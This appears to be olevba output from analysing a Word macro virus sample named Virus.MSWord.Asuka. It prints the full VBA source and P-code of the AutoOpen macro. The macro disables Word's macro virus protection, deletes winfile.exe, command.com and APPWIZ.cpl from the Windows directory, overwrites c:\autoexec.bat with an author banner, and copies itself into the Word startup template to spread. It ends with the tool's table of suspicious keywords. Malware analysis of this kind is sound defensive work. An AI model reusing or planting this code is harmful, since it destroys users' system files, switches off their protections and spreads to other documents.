olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Asuka
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Asuka - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Virus.MSWord.Asuka - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function Donde_esta_Windowsdirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Sub AutoOpen()
On Error GoTo RutinaDeError
Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
ShowVisualBasicEditor = False
Dim DirName As String
Dim Shinji As String
    DirName = Donde_esta_Windows()
    Shinji = DirName
Kill (Shinji + "winfile.exe")
Kill (Shinji + "command.com")
Kill (Shinji + "SYSTEM\APPWIZ.cpl")
Open "c:\autoexec.bat" For Output As #1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "ECHO          *********************************************************"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                  ViRuS: ASUKA  ANTI - T               *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                         AUTOR:                        *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                  ©©©© DarK OmEGA  ©©©©                *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                      LIMA - PERU                      *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                       16/FEB/00                       *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                     ®®®®®®®®®®®®®®                    *"
Print #1, "ECHO          *                     §            §                    *"
Print #1, "ECHO          *                     §   A.B.G    §                    *"
Print #1, "ECHO          *********************************************************"
Print #1, "pause"
Close #1
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
RutinaDeError:
Exit Sub
End Sub

Function Donde_esta_Windows() As String
    Dim Temp As String
    Dim Ret As Long
    Const MAX_LENGTH = 145

    Temp = String$(MAX_LENGTH, 0)
    Ret = Donde_esta_Windowsdirectory(Temp, MAX_LENGTH)
    Temp = Left$(Temp, Ret)
    If Temp <> "" And Right$(Temp, 1) <> "\" Then
        Donde_esta_Windows = Temp & "\"
    Else
        Donde_esta_Windows = Temp
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Asuka
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1143 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' Line #3:
' 	EndSub 
' Macros/VBA/Módulo1 - 6238 bytes
' Line #0:
' 	FuncDefn (Private Declare Function Donde_esta_Windowsdirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' Line #2:
' 	FuncDefn (Sub AutoOpen())
' Line #3:
' 	OnError RutinaDeError 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #6:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #7:
' 	Dim 
' 	VarDefn DirName (As String)
' Line #8:
' 	Dim 
' 	VarDefn Shinji (As String)
' Line #9:
' 	ArgsLd Donde_esta_Windows 0x0000 
' 	St DirName 
' Line #10:
' 	Ld DirName 
' 	St Shinji 
' Line #11:
' 	Ld Shinji 
' 	LitStr 0x000B "winfile.exe"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #12:
' 	Ld Shinji 
' 	LitStr 0x000B "command.com"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #13:
' 	Ld Shinji 
' 	LitStr 0x0011 "SYSTEM\APPWIZ.cpl"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #14:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *********************************************************"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                  ViRuS: ASUKA  ANTI - T               *"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                         AUTOR:                        *"
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                  ©©©© DarK OmEGA  ©©©©                *"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                      LIMA - PERU                      *"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                       16/FEB/00                       *"
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                                                       *"
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                     ®®®®®®®®®®®®®®                    *"
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                     §            §                    *"
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *                     §   A.B.G    §                    *"
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "ECHO          *********************************************************"
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #35:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\word8.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #36:
' 	Label RutinaDeError 
' Line #37:
' 	ExitSub 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Function Donde_esta_Windows() As String)
' Line #41:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #42:
' 	Dim 
' 	VarDefn Ret (As Long)
' Line #43:
' 	Dim (Const) 
' 	LitDI2 0x0091 
' 	VarDefn MAX_LENGTH
' Line #44:
' Line #45:
' 	Ld MAX_LENGTH 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St Temp 
' Line #46:
' 	Ld Temp 
' 	Ld MAX_LENGTH 
' 	ArgsLd Donde_esta_Windowsdirectory 0x0002 
' 	St Ret 
' Line #47:
' 	Ld Temp 
' 	Ld Ret 
' 	ArgsLd LBound$ 0x0002 
' 	St Temp 
' Line #48:
' 	Ld Temp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Temp 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld Temp 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Donde_esta_Windows 
' Line #50:
' 	ElseBlock 
' Line #51:
' 	Ld Temp 
' 	St Donde_esta_Windows 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winfile.exe         |Executable file name                         |
|IOC       |APPWIZ.cpl          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

